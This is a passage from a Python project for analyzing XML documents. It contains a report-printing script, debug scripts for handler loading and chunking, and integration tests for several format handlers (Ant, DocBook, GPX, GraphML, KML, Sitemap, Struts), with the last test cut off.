        accessibility = findings['accessibility']
        print(f"\n♿ Accessibility:")
        print(f"  - Alt Texts: {accessibility['alt_texts']}")
        print(f"  - Missing Alt Texts: {accessibility['missing_alt_texts']}")
        print(f"  - ARIA Attributes: {accessibility['aria_attributes']}")
        print(f"  - Form Labels: {accessibility['form_labels']}")
        print(f"  - Unlabeled Inputs: {accessibility['unlabeled_inputs']}")
        print(f"  - Landmark Roles: {accessibility['landmark_roles']}")
        print(f"  - Heading Structure: {accessibility['heading_structure'][:10]}...")
        
        # Links and media
        links_media = findings['links_and_media']
        print(f"\n🔗 Links and Media:")
        print(f"  - Total Links: {links_media['total_links']}")
        print(f"  - Internal Links: {links_media['internal_links']}")
        print(f"  - External Links: {links_media['external_links']}")
        print(f"  - Email Links: {links_media['email_links']}")
        print(f"  - Images: {links_media['images']}")
        print(f"  - Videos: {links_media['videos']}")
        print(f"  - Audio: {links_media['audio']}")
        
        # Forms
        forms = findings['forms']
        print(f"\n📝 Forms:")
        print(f"  - Form Count: {forms['form_count']}")
        print(f"  - Total Inputs: {forms['total_inputs']}")
        print(f"  - Input Types: {forms['input_types']}")
        print(f"  - Select Elements: {forms['select_elements']}")
        print(f"  - Textarea Elements: {forms['textarea_elements']}")
        print(f"  - Button Elements: {forms['button_elements']}")
        print(f"  - Form Methods: {forms['form_methods']}")
        
        # Styling and scripts
        styling = findings['styling_and_scripts']
        print(f"\n🎨 Styling and Scripts:")
        print(f"  - Inline Styles: {styling['inline_styles']}")
        print(f"  - External Stylesheets: {styling['external_stylesheets']}")
        print(f"  - Inline Scripts: {styling['inline_scripts']}")
        print(f"  - External Scripts: {styling['external_scripts']}")
        print(f"  - Style Attributes: {styling['style_attributes']}")
        
        # Standards compliance
        compliance = findings['standards_compliance']
        print(f"\n✅ Standards Compliance:")
        print(f"  - Has DOCTYPE: {compliance['has_doctype']}")
        print(f"  - Has XMLNS: {compliance['has_xmlns']}")
        print(f"  - Has Lang: {compliance['has_lang']}")
        print(f"  - Well Formed: {compliance['well_formed']}")
        print(f"  - Semantic Structure: {compliance['semantic_structure']}")
        
        # Quality metrics
        quality = analysis.quality_metrics
        print(f"\n📈 Quality Metrics:")
        for metric, value in quality.items():
            print(f"  - {metric.replace('_', ' ').title()}: {value:.2f}")
        
        # AI use cases (first 5)
        print(f"\n🤖 AI Use Cases ({len(analysis.ai_use_cases)}):")
        for i, use_case in enumerate(analysis.ai_use_cases[:5], 1):
            print(f"  {i}. {use_case}")
        
        # Key structured data preview
        key_data = analysis.structured_data
        print(f"\n🔍 Key Structured Data:")
        print(f"  - Page Metadata Keys: {list(key_data['page_metadata'].keys())}")
        print(f"  - Content Hierarchy Items: {len(key_data['content_hierarchy'])}")
        print(f"  - Navigation Structures: {len(key_data['navigation_structure'])}")
        print(f"  - Form Data Items: {len(key_data['form_data'])}")
        print(f"  - Media Inventory Types: {list(key_data['media_inventory'].keys())}")
        
        print(f"\n✅ Comprehensive analysis completed successfully!")
        
    except Exception as e:
        print(f"❌ Analysis failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
</file>

<file path="tests/debug/debug_analyzer_issue.py">
#!/usr/bin/env python3
"""
Debug why the analyzer isn't using specialized handlers in the comprehensive test
"""

import sys
import os
import traceback

# Add src to path  
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

def debug_analyzer_issue():
    """Debug the analyzer import and handler loading issue"""
    
    print("🔍 DEBUGGING ANALYZER ISSUE")
    print("=" * 50)
    
    # Test 1: Direct import
    print("1. Testing direct import...")
    try:
        from core.analyzer import XMLDocumentAnalyzer
        analyzer = XMLDocumentAnalyzer()
        print(f"   ✅ Direct import successful: {len(analyzer.handlers)} handlers")
    except Exception as e:
        print(f"   ❌ Direct import failed: {e}")
        traceback.print_exc()
        return
    
    # Test 2: Check handlers registry
    print("\n2. Testing handlers registry...")
    try:
        from handlers import ALL_HANDLERS
        print(f"   ✅ Registry import successful: {len(ALL_HANDLERS)} handlers in registry")
        print(f"   First 5: {[h.__name__ for h in ALL_HANDLERS[:5]]}")
    except Exception as e:
        print(f"   ❌ Registry import failed: {e}")
        traceback.print_exc()
    
    # Test 3: Test with a specific file
    print("\n3. Testing analysis with specific file...")
    test_file = "sample_data/test_files/small/ant/apache-ant-build.xml"
    if os.path.exists(test_file):
        try:
            result = analyzer.analyze_document(test_file)
            
            if hasattr(result, 'document_type'):
                doc_type = result.document_type
                handler_used = getattr(result, 'handler_used', 'unknown')
            else:
                doc_type = result.get('document_type', 'unknown')
                handler_used = result.get('handler_used', 'unknown')
            
            print(f"   📋 Document Type: {doc_type}")
            print(f"   🔧 Handler Used: {handler_used}")
            
            if 'Generic XML' in str(doc_type):
                print(f"   ⚠️ Using generic handler - let's debug why...")
                
                # Debug: Test individual handlers
                import xml.etree.ElementTree as ET
                tree = ET.parse(test_file)
                root = tree.getroot()
                namespaces = dict(root.attrib)
                
                print(f"   🔍 Testing individual handlers:")
                for i, handler in enumerate(analyzer.handlers[:5]):
                    try:
                        can_handle, confidence = handler.can_handle(root, namespaces)
                        print(f"      {handler.__class__.__name__}: {can_handle} ({confidence:.2%})")
                        if can_handle:
                            print(f"         ✅ This handler should be used!")
                    except Exception as he:
                        print(f"      {handler.__class__.__name__}: ERROR - {he}")
                        
        except Exception as e:
            print(f"   ❌ Analysis failed: {e}")
            traceback.print_exc()
    else:
        print(f"   ⚠️ Test file not found: {test_file}")
    
    # Test 4: Check if there are import cycles or path issues
    print("\n4. Checking for import issues...")
    
    # Test importing individual handlers
    test_handlers = [
        'ant_build_handler.AntBuildHandler',
        'scap_handler.SCAPHandler', 
        'log4j_config_handler.Log4jConfigHandler'
    ]
    
    for handler_path in test_handlers:
        module_name, class_name = handler_path.split('.')
        try:
            module = __import__(f'handlers.{module_name}', fromlist=[class_name])
            handler_class = getattr(module, class_name)
            handler_instance = handler_class()
            print(f"   ✅ {handler_path}: OK")
        except Exception as e:
            print(f"   ❌ {handler_path}: {e}")

if __name__ == "__main__":
    debug_analyzer_issue()
</file>

<file path="tests/debug/debug_hierarchical_chunking.py">
#!/usr/bin/env python3
"""
Debug hierarchical chunking issue
"""

import sys
import os
import xml.etree.ElementTree as ET

# Add src to path  
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from core.chunking import HierarchicalChunking, ChunkingConfig

def debug_hierarchical_chunking():
    """Debug why hierarchical chunking produces 0 chunks"""
    
    print("🔍 DEBUGGING HIERARCHICAL CHUNKING")
    print("=" * 50)
    
    # Test with SCAP file
    scap_file = "sample_data/test_files/small/scap/ios-sample-1.1.xccdf.xml"
    
    if not os.path.exists(scap_file):
        print(f"❌ File not found: {scap_file}")
        return
    
    # Parse the file
    tree = ET.parse(scap_file)
    root = tree.getroot()
    
    print(f"📄 File: {scap_file}")
    print(f"🌳 Root element: {root.tag}")
    
    # Create hierarchical chunker
    config = ChunkingConfig()
    chunker = HierarchicalChunking(config)
    
    # Test semantic boundaries detection
    print(f"\n🎯 Testing semantic boundaries detection")
    print("-" * 40)
    
    # Test with different document types
    test_types = [
        "SCAP Security Report",
        "SCAP/XSD Schema", 
        "ServiceNow Export",
        "Unknown Type"
    ]
    
    for doc_type in test_types:
        boundaries = chunker._get_semantic_boundaries(doc_type)
        print(f"Document type: '{doc_type}'")
        print(f"  Semantic boundaries: {boundaries}")
        
        # Test if any elements match these boundaries
        matching_elements = []
        for elem in root.iter():
            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            if tag in boundaries:
                matching_elements.append(tag)
        
        unique_matches = list(set(matching_elements))
        print(f"  Matching elements in file: {unique_matches[:10]}{'...' if len(unique_matches) > 10 else ''}")
        print(f"  Total matching elements: {len(matching_elements)}")
        print()
    
    # Examine actual elements in the file
    print(f"🔍 Analyzing actual elements in file")
    print("-" * 40)
    
    element_counts = {}
    for elem in root.iter():
        tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
        element_counts[tag] = element_counts.get(tag, 0) + 1
    
    print(f"Top 15 elements in file:")
    for tag, count in sorted(element_counts.items(), key=lambda x: x[1], reverse=True)[:15]:
        print(f"  {tag}: {count}")
    
    # Test with a custom analysis that should work
    print(f"\n🛠️ Testing with custom semantic boundaries")
    print("-" * 40)
    
    # Create analysis dict with proper boundaries for this file
    analysis_dict = {
        'document_type': {'type_name': 'SCAP Security Report'},  # Use the working type
        'key_findings': {},
        'structured_data': {}
    }
    
    # Test chunking with this analysis
    try:
        chunks = chunker.chunk_document(scap_file, analysis_dict)
        print(f"✅ With 'SCAP Security Report' type: Generated {len(chunks)} chunks")
        
        if chunks:
            for i, chunk in enumerate(chunks[:3]):
                print(f"  Chunk {i+1}: {chunk.token_estimate} tokens, path: {chunk.element_path}")
        
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
    
    # Test with improved boundaries that match file content
    print(f"\n🎯 Testing with file-specific boundaries")
    print("-" * 40)
    
    # Override the semantic boundaries temporarily
    original_method = chunker._get_semantic_boundaries
    
    def custom_boundaries(doc_type):
        # Use elements that actually exist in our test files
        return ["Rule", "Group", "Benchmark", "complexType", "element", "incident", "sys_journal_field"]
    
    chunker._get_semantic_boundaries = custom_boundaries
    
    try:
        chunks = chunker.chunk_document(scap_file, analysis_dict)
        print(f"✅ With custom boundaries: Generated {len(chunks)} chunks")
        
        if chunks:
            for i, chunk in enumerate(chunks[:3]):
                print(f"  Chunk {i+1}: {chunk.token_estimate} tokens, path: {chunk.element_path}")
                print(f"    Elements: {chunk.elements_included[:5]}")
        
    except Exception as e:
        print(f"❌ Error with custom boundaries: {e}")
    finally:
        # Restore original method
        chunker._get_semantic_boundaries = original_method
    
    print(f"\n💡 DIAGNOSIS")
    print("-" * 20)
    print("The hierarchical chunking strategy fails because:")
    print("1. Document type detection doesn't match predefined semantic boundaries")
    print("2. Generic fallback boundaries don't match actual XML element names")
    print("3. No elements are identified as semantic boundaries")
    print("4. Without boundaries, no chunks are created")
    
    print(f"\n🔧 SOLUTIONS")
    print("-" * 20)
    print("1. Add more document types to semantic_boundaries mapping")
    print("2. Improve element name matching (handle namespaces better)")
    print("3. Add dynamic boundary detection based on file analysis")
    print("4. Provide fallback chunking when no boundaries found")

if __name__ == "__main__":
    debug_hierarchical_chunking()
</file>

<file path="tests/integration/__init__.py">
"""Integration tests for handlers with the main framework"""
</file>

<file path="tests/integration/test_ant_integration.py">
#!/usr/bin/env python3
"""
Test Ant Handler Integration

Test that the Ant handler works properly with the main XML analyzer.
"""

import sys
from pathlib import Path

# Add src directory to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

def test_integration():
    """Test Ant handler integration with main analyzer"""
    print("🔗 Testing Ant Handler Integration")
    print("=" * 50)
    
    try:
        # Import main analyzer
        from core.analyzer import XMLDocumentAnalyzer
        
        # Create analyzer (should load Ant handler from registry)
        analyzer = XMLDocumentAnalyzer()
        print(f"✅ Analyzer created with {len(analyzer.handlers)} handlers")
        
        # Check if Ant handler is loaded
        ant_handler_loaded = any(handler.__class__.__name__ == 'AntBuildHandler' for handler in analyzer.handlers)
        print(f"✅ Ant handler loaded: {ant_handler_loaded}")
        
        # Test with an Ant build file
        test_file = "../../sample_data/test_files_synthetic/small/ant/build.xml"
        if not Path(test_file).exists():
            print("❌ Test file not found, skipping integration test")
            return False
        
        print(f"\n🧪 Testing integration with: {Path(test_file).name}")
        
        # Analyze the file
        result = analyzer.analyze_document(test_file)
        
        # Check results
        if 'error' in result:
            print(f"❌ Analysis failed: {result['error']}")
            return False
        
        print("✅ Analysis completed successfully")
        print(f"  📄 Document Type: {result['document_type'].type_name}")
        print(f"  🎯 Handler Used: {result['handler_used']}")
        print(f"  📊 Confidence: {result['confidence']:.2f}")
        
        # Verify it's using the Ant handler
        if result['handler_used'] != 'AntBuildHandler':
            print(f"❌ Expected AntBuildHandler, got {result['handler_used']}")
            return False
        
        if result['document_type'].type_name != 'Apache Ant Build':
            print(f"❌ Expected 'Apache Ant Build', got {result['document_type'].type_name}")
            return False
        
        # Check analysis details
        analysis = result.get('analysis')
        if analysis:
            print(f"  🔍 Key Findings:")
            print(f"    - Targets: {len(analysis.key_findings.get('targets', []))}")
            print(f"    - Properties: {len(analysis.key_findings.get('properties', {}).get('inline_properties', {}))}")
            print(f"    - Quality Score: {analysis.quality_metrics.get('overall', 0):.2f}")
        
        print("\n🎉 Integration test PASSED!")
        print("✅ Ant handler is properly integrated with the main analyzer")
        return True
        
    except Exception as e:
        print(f"❌ Integration test failed: {e}")
        import traceback
        traceback.print_exc()
        return False

def main():
    """Main test execution"""
    success = test_integration()
    
    if success:
        print(f"\n✅ Ant Build Handler successfully implemented and integrated!")
        print(f"📊 Ready to update checklist and move to next handler")
    else:
        print(f"\n❌ Integration issues found - fix before proceeding")
    
    return success

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
</file>

<file path="tests/integration/test_docbook_integration.py">
#!/usr/bin/env python3
"""
Test DocBook handler integration with main analyzer
"""

import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_docbook_integration():
    """Test DocBook handler integration with main analyzer"""
    
    try:
        from core.analyzer import XMLDocumentAnalyzer
        print("✅ XMLDocumentAnalyzer imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import XMLDocumentAnalyzer: {e}")
        return False
    
    # Test registry import
    try:
        from handlers import ALL_HANDLERS, DocBookHandler
        print(f"✅ Handler registry imported successfully ({len(ALL_HANDLERS)} handlers)")
        
        # Check if DocBookHandler is in the registry
        docbook_handler_in_registry = any(h.__name__ == 'DocBookHandler' for h in ALL_HANDLERS)
        print(f"✅ DocBookHandler in registry: {docbook_handler_in_registry}")
        
    except ImportError as e:
        print(f"❌ Failed to import handler registry: {e}")
        return False
    
    # Test with sample DocBook file
    analyzer = XMLDocumentAnalyzer()
    test_file = "../../sample_data/test_files_synthetic/small/docbook/book.xml"
    
    if not Path(test_file).exists():
        print(f"❌ Test file not found: {test_file}")
        return False
    
    print(f"\n🔍 Testing integration with {test_file}")
    
    try:
        result = analyzer.analyze_document(test_file)
        
        print(f"✅ Analysis completed successfully")
        print(f"  - Handler used: {result['handler_used']}")
        print(f"  - Document type: {result['document_type'].type_name}")
        print(f"  - Confidence: {result['confidence']:.1f}")
        print(f"  - Analysis type: {result['analysis'].document_type}")
        
        # Verify it's using the DocBook handler
        if result['handler_used'] != 'DocBookHandler':
            print(f"❌ Wrong handler used! Expected DocBookHandler, got {result['handler_used']}")
            return False
        
        # Check analysis details
        findings = result['analysis'].key_findings
        print(f"  - Chapters found: {len(findings['structure']['chapters'])}")
        print(f"  - Sections found: {findings['structure']['total_sections']}")
        print(f"  - Paragraphs found: {findings['content_stats']['paragraphs']}")
        
        print("✅ DocBook handler integration successful!")
        return True
        
    except Exception as e:
        print(f"❌ Analysis failed: {e}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == "__main__":
    print("🧪 DocBook Handler Integration Test")
    print("=" * 50)
    
    success = test_docbook_integration()
    
    if success:
        print("\n🎉 DocBook handler integration test passed!")
        sys.exit(0)
    else:
        print("\n❌ DocBook handler integration test failed!")
        sys.exit(1)
</file>

<file path="tests/integration/test_gpx_integration.py">
#!/usr/bin/env python3
"""
Test GPX handler integration with main analyzer
"""

import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_gpx_integration():
    """Test GPX handler integration with main analyzer"""
    
    try:
        from core.analyzer import XMLDocumentAnalyzer
        print("✅ XMLDocumentAnalyzer imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import XMLDocumentAnalyzer: {e}")
        return False
    
    # Test registry import
    try:
        from handlers import ALL_HANDLERS, GPXHandler
        print(f"✅ Handler registry imported successfully ({len(ALL_HANDLERS)} handlers)")
        
        # Check if GPXHandler is in the registry
        gpx_handler_in_registry = any(h.__name__ == 'GPXHandler' for h in ALL_HANDLERS)
        print(f"✅ GPXHandler in registry: {gpx_handler_in_registry}")
        
    except ImportError as e:
        print(f"❌ Failed to import handler registry: {e}")
        return False
    
    # Test with sample GPX files
    analyzer = XMLDocumentAnalyzer()
    test_files = [
        "../../sample_data/test_files_synthetic/small/gpx/simple_waypoints.gpx",
        "../../sample_data/test_files_synthetic/small/gpx/hiking_track.gpx"
    ]
    
    for test_file in test_files:
        if not Path(test_file).exists():
            print(f"❌ Test file not found: {test_file}")
            continue
        
        print(f"\n🔍 Testing integration with {test_file}")
        
        try:
            result = analyzer.analyze_document(test_file)
            
            print(f"✅ Analysis completed successfully")
            print(f"  - Handler used: {result['handler_used']}")
            print(f"  - Document type: {result['document_type'].type_name}")
            print(f"  - Version: {result['document_type'].version}")
            print(f"  - Content type: {result['document_type'].metadata.get('content_type')}")
            print(f"  - Confidence: {result['confidence']:.1f}")
            print(f"  - Analysis type: {result['analysis'].document_type}")
            
            # Verify it's using the GPX handler
            if result['handler_used'] != 'GPXHandler':
                print(f"❌ Wrong handler used! Expected GPXHandler, got {result['handler_used']}")
                return False
            
            # Check analysis details
            findings = result['analysis'].key_findings
            inventory = result['analysis'].data_inventory
            
            print(f"  - Waypoints: {inventory['waypoints']}")
            print(f"  - Routes: {inventory['routes']}")
            print(f"  - Tracks: {inventory['tracks']}")
            print(f"  - Track points: {inventory['track_points']}")
            
            if inventory['time_span_hours'] > 0:
                print(f"  - Duration: {inventory['time_span_hours']:.2f} hours")
            
            stats = findings['statistics']
            if stats['total_distance_km'] > 0:
                print(f"  - Distance: {stats['total_distance_km']:.2f} km")
            if stats['elevation_gain_m'] > 0:
                print(f"  - Elevation gain: {stats['elevation_gain_m']:.0f} m")
            
            quality = result['analysis'].quality_metrics
            print(f"  - Overall quality: {quality['overall']:.2f}")
            
            print("  ✅ Integration test passed")
            
        except Exception as e:
            print(f"❌ Analysis failed: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    return True

if __name__ == "__main__":
    print("🧪 GPX Handler Integration Test")
    print("=" * 50)
    
    success = test_gpx_integration()
    
    if success:
        print("\n🎉 GPX handler integration test passed!")
        sys.exit(0)
    else:
        print("\n❌ GPX handler integration test failed!")
        sys.exit(1)
</file>

<file path="tests/integration/test_graphml_integration.py">
#!/usr/bin/env python3
"""
Test GraphML handler integration with main analyzer
"""

import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_graphml_integration():
    """Test GraphML handler integration with main analyzer"""
    
    try:
        from core.analyzer import XMLDocumentAnalyzer
        print("✅ XMLDocumentAnalyzer imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import XMLDocumentAnalyzer: {e}")
        return False
    
    # Test registry import
    try:
        from handlers import ALL_HANDLERS, GraphMLHandler
        print(f"✅ Handler registry imported successfully ({len(ALL_HANDLERS)} handlers)")
        
        # Check if GraphMLHandler is in the registry
        graphml_handler_in_registry = any(h.__name__ == 'GraphMLHandler' for h in ALL_HANDLERS)
        print(f"✅ GraphMLHandler in registry: {graphml_handler_in_registry}")
        
    except ImportError as e:
        print(f"❌ Failed to import handler registry: {e}")
        return False
    
    # Test with sample GraphML files
    analyzer = XMLDocumentAnalyzer()
    test_files = [
        "../../sample_data/test_files_synthetic/small/graphml/simple_network.graphml",
        "../../sample_data/test_files_synthetic/small/graphml/neural_network.graphml"
    ]
    
    for test_file in test_files:
        if not Path(test_file).exists():
            print(f"❌ Test file not found: {test_file}")
            continue
        
        print(f"\n🔍 Testing integration with {test_file}")
        
        try:
            result = analyzer.analyze_document(test_file)
            
            print(f"✅ Analysis completed successfully")
            print(f"  - Handler used: {result['handler_used']}")
            print(f"  - Document type: {result['document_type'].type_name}")
            print(f"  - Version: {result['document_type'].version}")
            print(f"  - Graph Type: {result['document_type'].metadata.get('graph_type')}")
            print(f"  - Complexity: {result['document_type'].metadata.get('complexity')}")
            print(f"  - Confidence: {result['confidence']:.1f}")
            print(f"  - Analysis type: {result['analysis'].document_type}")
            
            # Verify it's using the GraphML handler
            if result['handler_used'] != 'GraphMLHandler':
                print(f"❌ Wrong handler used! Expected GraphMLHandler, got {result['handler_used']}")
                return False
            
            # Check analysis details
            findings = result['analysis'].key_findings
            inventory = result['analysis'].data_inventory
            
            print(f"  - Total graphs: {inventory['total_graphs']}")
            print(f"  - Total nodes: {inventory['total_nodes']}")
            print(f"  - Total edges: {inventory['total_edges']}")
            print(f"  - Attribute keys: {inventory['attribute_keys']}")
            print(f"  - Data elements: {inventory['data_elements']}")
            
            # Graph structure
            structure = findings['graph_structure']
            print(f"  - Graph count: {structure['graph_count']}")
            print(f"  - Directed/Undirected: {structure['directed_graphs']}/{structure['undirected_graphs']}")
            
            # Network metrics
            metrics = findings['network_metrics']
            print(f"  - Density: {metrics['density']:.3f}")
            print(f"  - Diameter estimate: {metrics['diameter_estimate']}")
            
            # Connectivity
            connectivity = findings['connectivity']
            print(f"  - Average degree: {connectivity['average_degree']:.2f}")
            print(f"  - Connectivity ratio: {connectivity['connectivity_ratio']:.3f}")
            
            # Quality
            quality = result['analysis'].quality_metrics
            print(f"  - Overall quality: {quality['overall']:.2f}")
            print(f"  - Completeness: {quality['completeness']:.2f}")
            
            print("  ✅ Integration test passed")
            
        except Exception as e:
            print(f"❌ Analysis failed: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    return True

if __name__ == "__main__":
    print("🧪 GraphML Handler Integration Test")
    print("=" * 50)
    
    success = test_graphml_integration()
    
    if success:
        print("\n🎉 GraphML handler integration test passed!")
        sys.exit(0)
    else:
        print("\n❌ GraphML handler integration test failed!")
        sys.exit(1)
</file>

<file path="tests/integration/test_kml_integration.py">
#!/usr/bin/env python3
"""
Test KML handler integration with main analyzer
"""

import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_kml_integration():
    """Test KML handler integration with main analyzer"""
    
    try:
        from core.analyzer import XMLDocumentAnalyzer
        print("✅ XMLDocumentAnalyzer imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import XMLDocumentAnalyzer: {e}")
        return False
    
    # Test registry import
    try:
        from handlers import ALL_HANDLERS, KMLHandler
        print(f"✅ Handler registry imported successfully ({len(ALL_HANDLERS)} handlers)")
        
        # Check if KMLHandler is in the registry
        kml_handler_in_registry = any(h.__name__ == 'KMLHandler' for h in ALL_HANDLERS)
        print(f"✅ KMLHandler in registry: {kml_handler_in_registry}")
        
    except ImportError as e:
        print(f"❌ Failed to import handler registry: {e}")
        return False
    
    # Test with sample KML file
    analyzer = XMLDocumentAnalyzer()
    test_file = "../../sample_data/test_files_synthetic/small/kml/simple_placemark.kml"
    
    if not Path(test_file).exists():
        print(f"❌ Test file not found: {test_file}")
        return False
    
    print(f"\n🔍 Testing integration with {test_file}")
    
    try:
        result = analyzer.analyze_document(test_file)
        
        print(f"✅ Analysis completed successfully")
        print(f"  - Handler used: {result['handler_used']}")
        print(f"  - Document type: {result['document_type'].type_name}")
        print(f"  - Confidence: {result['confidence']:.1f}")
        print(f"  - Analysis type: {result['analysis'].document_type}")
        
        # Verify it's using the KML handler
        if result['handler_used'] != 'KMLHandler':
            print(f"❌ Wrong handler used! Expected KMLHandler, got {result['handler_used']}")
            return False
        
        # Check analysis details
        findings = result['analysis'].key_findings
        structure = findings['structure']
        print(f"  - Total features: {structure['total_features']}")
        print(f"  - Placemarks: {len(findings['placemarks'])}")
        print(f"  - Geometries: {findings['geometries']['total']}")
        
        if findings['placemarks']:
            placemark = findings['placemarks'][0]
            print(f"  - First placemark: {placemark.get('name', 'Unnamed')}")
            print(f"  - Geometry type: {placemark.get('geometry_type', 'None')}")
        
        print("✅ KML handler integration successful!")
        return True
        
    except Exception as e:
        print(f"❌ Analysis failed: {e}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == "__main__":
    print("🧪 KML Handler Integration Test")
    print("=" * 50)
    
    success = test_kml_integration()
    
    if success:
        print("\n🎉 KML handler integration test passed!")
        sys.exit(0)
    else:
        print("\n❌ KML handler integration test failed!")
        sys.exit(1)
</file>

<file path="tests/integration/test_sitemap_integration.py">
#!/usr/bin/env python3
"""
Test Sitemap handler integration with main analyzer
"""

import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_sitemap_integration():
    """Test Sitemap handler integration with main analyzer"""
    
    try:
        from core.analyzer import XMLDocumentAnalyzer
        print("✅ XMLDocumentAnalyzer imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import XMLDocumentAnalyzer: {e}")
        return False
    
    # Test registry import
    try:
        from handlers import ALL_HANDLERS, SitemapHandler
        print(f"✅ Handler registry imported successfully ({len(ALL_HANDLERS)} handlers)")
        
        # Check if SitemapHandler is in the registry
        sitemap_handler_in_registry = any(h.__name__ == 'SitemapHandler' for h in ALL_HANDLERS)
        print(f"✅ SitemapHandler in registry: {sitemap_handler_in_registry}")
        
    except ImportError as e:
        print(f"❌ Failed to import handler registry: {e}")
        return False
    
    # Test with sample Sitemap file
    analyzer = XMLDocumentAnalyzer()
    test_file = "../../sample_data/test_files_synthetic/small/sitemap/urlset.xml"
    
    if not Path(test_file).exists():
        print(f"❌ Test file not found: {test_file}")
        return False
    
    print(f"\n🔍 Testing integration with {test_file}")
    
    try:
        result = analyzer.analyze_document(test_file)
        
        print(f"✅ Analysis completed successfully")
        print(f"  - Handler used: {result['handler_used']}")
        print(f"  - Document type: {result['document_type'].type_name}")
        print(f"  - Confidence: {result['confidence']:.1f}")
        print(f"  - Analysis type: {result['analysis'].document_type}")
        
        # Verify it's using the Sitemap handler
        if result['handler_used'] != 'SitemapHandler':
            print(f"❌ Wrong handler used! Expected SitemapHandler, got {result['handler_used']}")
            return False
        
        # Check analysis details
        findings = result['analysis'].key_findings
        content_analysis = findings['content_analysis']
        print(f"  - URLs found: {content_analysis.get('url_count', 0)}")
        print(f"  - Priority values: {len(content_analysis.get('priorities', {}))}")
        print(f"  - Change frequencies: {len(content_analysis.get('change_frequencies', {}))}")
        
        seo_analysis = findings['seo_analysis']
        if 'priority_distribution' in seo_analysis:
            print(f"  - Average priority: {seo_analysis['priority_distribution'].get('average_priority', 0):.2f}")
        
        print("✅ Sitemap handler integration successful!")
        return True
        
    except Exception as e:
        print(f"❌ Analysis failed: {e}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == "__main__":
    print("🧪 Sitemap Handler Integration Test")
    print("=" * 50)
    
    success = test_sitemap_integration()
    
    if success:
        print("\n🎉 Sitemap handler integration test passed!")
        sys.exit(0)
    else:
        print("\n❌ Sitemap handler integration test failed!")
        sys.exit(1)
</file>

<file path="tests/integration/test_struts_integration.py">
#!/usr/bin/env python3
"""
Test Struts Configuration handler integration with main analyzer
"""

import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_struts_integration():
    """Test Struts Configuration handler integration with main analyzer"""
    
    try:
        from core.analyzer import XMLDocumentAnalyzer
        print("✅ XMLDocumentAnalyzer imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import XMLDocumentAnalyzer: {e}")
        return False
    
    # Test registry import
    try:
        from handlers import ALL_HANDLERS, StrutsConfigHandler
        print(f"✅ Handler registry imported successfully ({len(ALL_HANDLERS)} handlers)")
        
        # Check if StrutsConfigHandler is in the registry
        struts_handler_in_registry = any(h.__name__ == 'StrutsConfigHandler' for h in ALL_HANDLERS)
        print(f"✅ StrutsConfigHandler in registry: {struts_handler_in_registry}")
        
    except ImportError as e:
        print(f"❌ Failed to import handler registry: {e}")
        return False
    
    # Test with sample Struts files
    analyzer = XMLDocumentAnalyzer()
    test_files = [
        "../../sample_data/test_files_synthetic/small/struts/simple_struts_config.xml",
        "../../sample_data/test_files_synthetic/small/struts/enterprise_struts_config.xml"
    ]
    
    for test_file in test_files:
        if not Path(test_file).exists():
            print(f"❌ Test file not found: {test_file}")
            continue
        
        print(f"\n🔍 Testing integration with {test_file}")
        
        try:
            result = analyzer.analyze_document(test_file)
            
            print(f"✅ Analysis completed successfully")
            print(f"  - Handler used: {result['handler_used']}")
            print(f"  - Document type: {result['document_type'].type_name}")
            print(f"  - Version: {result['document_type'].version}")
            print(f"  - Config Type: {result['document_type'].metadata.get('config_type')}")
            print(f"  - Complexity: {result['document_type'].metadata.get('complexity')}")
            print(f"  - Confidence: {result['confidence']:.1f}")
            print(f"  - Analysis type: {result['analysis'].document_type}")
            
            # Verify it's using the Struts handler
            if result['handler_used'] != 'StrutsConfigHandler':
                print(f"❌ Wrong handler used! Expected StrutsConfigHandler, got {result['handler_used']}")
                return False
            
            # Check analysis details
            findings = result['analysis'].key_findings
            inventory = result['analysis'].data_inventory
            
            print(f"  - Total actions: {inventory['total_actions']}")
            print(f"  - Form beans: {inventory['form_beans']}")
            print(f"  - Global forwards: {inventory['global_forwards']}")
            print(f"  - Data sources: {inventory['data_sources']}")
            print(f"  - Plugins: {inventory['plugins']}")
            
            # Action mappings
            actions = findings['action_mappings']
            print(f"  - Action count: {actions['action_count']}")
            print(f"  - Action types: {len(actions['action_types'])}")
            
            # Security analysis
            security = findings['security_analysis']
            print(f"  - Validation enabled: {security['validation_enabled']}")
            print(f"  - Potential vulnerabilities: {len(security['potential_vulnerabilities'])}")
            
            # Architecture metrics
            arch_metrics = findings['architecture_metrics']
            print(f"  - Complexity score: {arch_metrics['complexity_score']:.2f}")
            print(f"  - Maintainability: {arch_metrics['maintainability_score']:.2f}")
            
            # Quality
            quality = result['analysis'].quality_metrics
            print(f"  - Overall quality: {quality['overall']:.2f}")
            print(f"  - Security quality: {quality['security_quality']:.2f}")
            
            print("  ✅ Integration test passed")
            
        except Exception as e:
            print(f"❌ Analysis failed: {e}")
